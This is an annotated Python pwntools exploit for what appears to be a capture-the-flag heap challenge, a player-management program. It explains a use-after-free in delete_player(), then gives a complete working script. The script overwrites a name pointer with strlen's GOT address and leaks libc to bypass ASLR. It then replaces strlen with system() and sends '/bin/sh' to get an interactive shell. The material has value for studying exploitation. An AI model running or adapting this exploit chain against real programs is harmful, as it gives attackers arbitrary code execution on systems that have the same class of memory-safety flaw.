# Exploit Summary:
"""
* Use a use-after-free condition to overwrite previously freed data structures
* Using the use-after-free one can take control and overwrite the 'name' pointer and overwrite it with a new address (pointer) pointing a new address for the attack to use
* The 'name' pointer address is overwritten with an address in the GOT (strlen)
* Using the built in program functionality (show_player()) one can display the contents of the name pointer (leak)
* By leaking the address of strlen, one can calculate the base address of libc bypassing ASLR
* By overwriting a pointer in the GOT one can overwrite where function calls (symbols) are jmping too
* By overwriting strlen() with system() one can execution system() and redirect code execution
* Once the GOT entry of strlen() is overwritten with system(), the next it is used it will call system()
* Execution occurs when /bin/sh is passed in via readline() to strlen()->system() using the set_name() function
"""

# Vulnerability Analysis:

"""
* When the add_player() function is called, it allocates an object on the heap that holds a 'name' pointer along with some local variables
* When the delete_player() function is called, it can delete a player object at an index. When supplying a correct index of a player, a free occurs on the object at the index specified
* A use-after-free condition occurs when the delete_player() frees the player object but does not set the object to NULL after freeing
* show_player() can later reference the freed variable causing a use-after-free
* add_player() can overwrite the freed heap object creating a read/write primitive
"""

from pwn import *

p = process('./main.elf')
#p = gdb.debug('./main.elf', 'b *0x401793')
#p = gdb.debug('./main.elf', 'b main')

context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

"""

                     show_player_func:
000000000040178b         push       rbp                                         ; End of unwind block (FDE at 0x402914), Begin of unwind block (FDE at 0x402934), CODE XREF=select_player+187, show_player+72, show_team+120
000000000040178c         mov        rbp, rsp
000000000040178f         sub        rsp, 0x10
0000000000401793         mov        qword [rbp+var_8], rdi
0000000000401797         mov        rax, qword [rbp+var_8]

"""

"""
+pwndbg> x/50gx $rdi
0xee4010:       0x0000000200000001      0x0000000400000003 <- Player attributes
0xee4020:       0x0000000000ee4030      0x0000000000000071 <- Heap pointer (ee4030)
0xee4030:       0x4141414141414141      0x4141414141414141 <- Player name string
0xee4040:       0x4141414141414141      0x4141414141414141
0xee4050:       0x4141414141414141      0x4141414141414141
0xee4060:       0x4141414141414141      0x4141414141414141
0xee4070:       0x4141414141414141      0x4141414141414141
0xee4080:       0x4141414141414141      0x4141414141414141
0xee4090:       0x0000000000000000      0x0000000000000021
0xee40a0:       0x0000000200000001      0x0000000400000003 <- Player attributes
0xee40b0:       0x0000000000ee40c0      0x0000000000000071 <- Heap pointer (ee40c0)
0xee40c0:       0x4242424242424242      0x4242424242424242 <- Player name string
0xee40d0:       0x4242424242424242      0x4242424242424242
0xee40e0:       0x4242424242424242      0x4242424242424242
0xee40f0:       0x4242424242424242      0x4242424242424242
0xee4100:       0x4242424242424242      0x4242424242424242
0xee4110:       0x4242424242424242      0x4242424242424242
0xee4120:       0x0000000000000000      0x0000000000020ee1
0xee4130:       0x0000000000000000      0x0000000000000000
0xee4140:       0x0000000000000000      0x0000000000000000
0xee4150:       0x0000000000000000      0x0000000000000000
0xee4160:       0x0000000000000000      0x0000000000000000
0xee4170:       0x0000000000000000      0x0000000000000000
0xee4180:       0x0000000000000000      0x0000000000000000
0xee4190:       0x0000000000000000      0x0000000000000000

"""

# Execution occurs here

"""
set_name:
push       rbp          ; End of unwind block (FDE at 0x402994), Begin of unwind block (FDE at 0x4029b4), CODE XREF=edit_player+101
mov        rbp, rsp
push       rbx
sub        rsp, 0x128
mov        rax, qword [fs:0x28]
mov        qword [rbp+var_18], rax
xor        eax, eax
mov        edi, aEnterNewName ; argument "__format" for method j_printf, "Enter new name: "
mov        eax, 0x0
call       j_printf     ; printf
mov        rax, qword [stdout@@GLIBC_2.2.5] ; stdout@@GLIBC_2.2.5
mov        rdi, rax     ; argument "__stream" for method j_fflush
call       j_fflush     ; fflush
lea        rax, qword [rbp+var_120]
mov        esi, 0x100
mov        rdi, rax     ; argument #1 for method readline
call       readline     ; readline <- data passed into readline()
lea        rax, qword [rbp+var_120]
mov        rdi, rax     ; argument "__s" for method j_strlen <- data argument for strlen()
call       j_strlen     ; strlen <- d <- strlen() is changed to system() and execution occurs
mov        rbx, rax
mov        rax, qword [selected] ; selected
mov        rax, qword [rax+0x10]
mov        rdi, rax     ; argument "__s" for method j_strlen
call       j_strlen     ; strlen
cmp        rbx, rax
jbe        loc_401db9
"""

def Pause():
	log.success("Pausing...")
	raw_input()

def Allocate(name, attack = 1, defense = 2, speed = 3,precision = 4):

	log.success("Allocating Player")
	p.recvuntil("choice: ")
	p.sendline("1")

	p.recvuntil("name: ")
	p.sendline(name)

	p.recvuntil("points: ")
	p.sendline(str(attack))

	p.recvuntil("points: ")
	p.sendline(str(defense))

	p.recvuntil("speed: ")
	p.sendline(str(speed))

	p.recvuntil("precision: ")
	p.sendline(str(precision))

	p.recvuntil("choice:")
	p.sendline('6')


def Free(index):

	log.success("Freeing Player at index: " + str(index))
	p.recvuntil("choice:")
	p.sendline("2")
	p.recvuntil("index:")
	p.sendline(str(index))

def Select(index):
	log.success("Selecting Player at index: " + str(index))
	p.recvuntil("choice:")
	p.sendline("3")
	p.recvuntil("index:")
	p.sendline(str(index))

def TriggerLeak():
	log.success("Triggering Use-After-Free")
	p.recvuntil("choice:")
	p.sendline('5')
	leak = p.recvline().split("Name: ")[1][:6].ljust(8, '\x00')
	log.success("Leaked strlen(): " + str(leak))
	return u64(leak)

def Execute():

	log.success("Executing /bin/sh")
	p.sendline("1")
	p.recvuntil("name:")
	p.sendline("/bin/sh")

def OverwriteGOT(address):

	log.success("Overwriting GOT")
	p.sendline("4")
	p.recvuntil("choice: ")
	p.sendline("1")
	p.recvuntil("name:")
	p.sendline(address)

def Exploit():

	log.success("Sending Exploit")

	player1 = "A" * 32
	player2 = "B" * 32
	player3 = "C" * 19
	strlen_addr = 0x603040

	GOTentry = "D" * 16 + p64(strlen_addr)
	libc_strlen = 0x8b720
	libc_system = 0x45390

	Allocate(player1) # add_player() 
	Allocate(player2) # add_player()
	Select("1") # select_player()
	Free("1") # delete_player()
	Free("0") # delete_player()
	log.success("Overwriting 'name' Pointer")
	Allocate(GOTentry) # add_player() # Overlap the heap object and overwrite the data structure
	log.success("Pointer 'name' Overwritten")
	leak = TriggerLeak() # show_player()
	libc_base = leak - libc_strlen
	log.success("libcbase: " + p64(libc_base))
	system = libc_base + libc_system
	log.success("system(): " + p64(system))
	OverwriteGOT(p64(system)) # set_name()
	log.success("GOT Overwritten with system()")
	Execute() # set_name() - Since we already overwrote strlen() with system() sending the name to /bin/sh will read read in via readline() and passed to system() before the strcpy()
	p.interactive()

Exploit()